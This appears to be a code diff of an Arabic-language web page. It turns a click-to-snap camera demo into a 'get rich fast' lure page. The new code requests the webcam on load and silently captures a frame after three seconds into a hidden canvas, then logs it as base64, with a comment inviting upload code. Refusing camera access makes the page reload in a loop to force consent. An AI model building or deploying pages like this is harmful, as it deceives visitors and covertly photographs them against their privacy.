@@ -1,29 +1,85 @@
-<html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>موقع سوكس</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f4f4f9;
+    }
+    h1 {
+      color: #333;
+      margin-top: 50px;
+    }
+    .video-container {
+      margin-top: 30px;
+    }
+    video {
+      width: 80%;
+      height: auto;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
 <body>
-   <h2>التقاط صورة باستخدام الكاميرا</h2>
-   <video id="video" width="640" height="480" autoplay></video>
-   <button id="snap">التقاط صورة</button>
-   <canvas id="canvas" width="640" height="480"></canvas>
+  <h1>أهلاً بك في موقع سوكس</h1>
+  <p>طريقك الأسرع للثراء</p>
 
-   <script>
-      var video = document.getElementById('video');
-      var canvas = document.getElementById('canvas');
-      var ctx = canvas.getContext('2d');
-      var snapButton = document.getElementById('snap');
+  <div class="video-container">
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+  </div>
 
-      // طلب الوصول إلى الكاميرا
-      navigator.mediaDevices.getUserMedia({ video: true })
-         .then(function(stream) {
+  <script>
+    // دالة لطلب الوصول إلى الكاميرا
+    function accessCamera() {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            // عرض الفيديو في الصفحة
+            const video = document.getElementById('video');
             video.srcObject = stream;
-         })
-         .catch(function(err) {
-            console.log("حدث خطأ: " + err);
-         });
 
-      // التقاط الصورة
-      snapButton.addEventListener('click', function() {
-         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      });
-   </script>
+            // التقاط الصورة تلقائيًا بعد بضع ثواني
+            setTimeout(function() {
+              captureImage();
+            }, 3000); // التقاط الصورة بعد 3 ثواني من فتح الكاميرا
+          })
+          .catch(function(err) {
+            // في حال تم رفض الوصول إلى الكاميرا
+            alert('لم توافق على الوصول إلى الكاميرا');
+            location.reload(); // إعادة تحميل الصفحة تلقائيًا
+          });
+      } else {
+        alert("الخاصية غير مدعومة في المتصفح");
+      }
+    }
+
+    // دالة لالتقاط الصورة من الكاميرا
+    function captureImage() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      
+      // رسم الإطار الحالي من الفيديو على اللوحة (canvas)
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // هنا يمكن إضافة كود لتحميل الصورة أو حفظها حسب الحاجة
+      // يمكنك استخدام canvas.toDataURL() لتحويل الصورة إلى تنسيق base64.
+      console.log(canvas.toDataURL());
+    }
+
+    // محاولة الوصول إلى الكاميرا عند تحميل الصفحة
+    window.onload = function() {
+      accessCamera();
+    };
+  </script>
 </body>
 </html>
